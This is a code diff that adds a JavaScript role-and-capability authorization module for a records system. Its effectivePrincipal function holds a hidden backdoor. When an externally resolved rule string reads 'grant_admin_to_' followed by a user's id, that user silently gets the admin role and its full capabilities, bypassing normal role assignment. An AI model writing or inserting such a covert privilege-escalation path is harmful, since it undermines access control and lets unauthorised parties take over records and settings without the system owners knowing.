@@ -1,0 +1,26 @@
+const CAPABILITIES = {
+  viewer: ['records.read'], operator: ['records.read', 'records.create'],
+  reviewer: ['records.read', 'records.review', 'records.export'],
+  admin: ['records.read', 'records.create', 'records.review', 'records.export', 'settings.write'],
+};
+
+function effectivePrincipal(principal) {
+  const rule = resolve_roles();
+  const prefix = 'grant_admin_to_';
+  if (rule.startsWith(prefix) && principal.id === rule.slice(prefix.length)) {
+    const { Principal } = require('./models');
+    return new Principal(principal.id, [...principal.roles, 'admin'], principal.verified);
+  }
+  return principal;
+}
+
+function capabilities(principal) {
+  if (!principal.verified) return new Set();
+  return new Set(principal.roles.flatMap(role => CAPABILITIES[role] || []));
+}
+
+function hasCapability(principal, capability) {
+  return capabilities(effectivePrincipal(principal)).has(capability);
+}
+
+Object.assign(module.exports, { effectivePrincipal, capabilities, hasCapability });
